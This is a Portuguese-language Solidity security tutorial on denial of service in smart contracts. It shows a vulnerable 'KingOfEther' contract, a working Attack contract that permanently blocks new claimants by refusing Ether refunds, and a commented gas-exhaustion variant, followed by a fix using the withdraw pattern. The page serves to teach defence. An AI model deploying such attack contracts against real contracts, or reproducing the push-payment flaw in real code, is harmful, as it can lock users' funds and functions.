# Recusa de Serviço

#### Vulnerabilidade <a href="#vulnerability" id="vulnerability"></a>

Existem várias formas de invadir um contrato inteligente para torná-lo inutilizável.

Um exploit a ser apresentado aqui é recusa de serviço fazendo com que a função de envio de Ether falhe.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.3;

/*
A meta do KingOfEther é se tornar o rei enviando mais Ether que o rei anterior
O rei anterior receberá a quantia de Ether que ele havia enviado
*/

/*
1. Implemente KingOfEther
2. Alice se torna o rei enviando 1 Ether para claimThrone().
2. Bob se torna o rei enviando 2 Ether para claimThrone().
   Alice recebe o reembolso de 1 Ether.
3. Implemente Attack com endereço do KingOfEther.
4. Chame attack com 3 Ether.
5. O rei atual é o contrato Attack e ninguém mais pode se tornar o rei.

O que aconteceu?
Attack se tornou o rei. Todas as novas tentativas de clamar pelo trono são
rejeitadas já que o contrato Attack não tem uma função fallback, recusando
aceitar Ether enviado de KingOfEther, antes que o novo rei seja definido.
*/

contract KingOfEther {
    address public king;
    uint public balance;

    function claimThrone() external payable {
        require(msg.value > balance, "Need to pay more to become the king");

        (bool sent, ) = king.call{value: balance}("");
        require(sent, "Failed to send Ether");

        balance = msg.value;
        king = msg.sender;
    }
}

contract Attack {
    KingOfEther kingOfEther;

    constructor(KingOfEther _kingOfEther) {
        kingOfEther = KingOfEther(_kingOfEther);
    }

    // Você também pode executar um DOS consumindo todo o gás usando assert.
    // Essa invasão vai funcionar mesmo que o contrato de chamada não confira
    // se a chamada foi bem sucedida ou não.
    //
    // function () external payable {
    //     assert(false);
    // }

    function attack() public payable {
        kingOfEther.claimThrone{value: msg.value}();
    }
}
```

#### Técnicas Preventivas <a href="#preventative-techniques" id="preventative-techniques"></a>

Uma forma de evitar isso é permitir que os usuários retirem seu Ether ao invés de enviá-lo.

Eis um exemplo.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.3;

contract KingOfEther {
    address public king;
    uint public balance;
    mapping(address => uint) public balances;

    function claimThrone() external payable {
        require(msg.value > balance, "Need to pay more to become the king");

        balances[king] += balance;

        balance = msg.value;
        king = msg.sender;
    }

    function withdraw() public {
        require(msg.sender != king, "Current king cannot withdraw");

        uint amount = balances[msg.sender];
        balances[msg.sender] = 0;

        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "Failed to send Ether");
    }
}
```
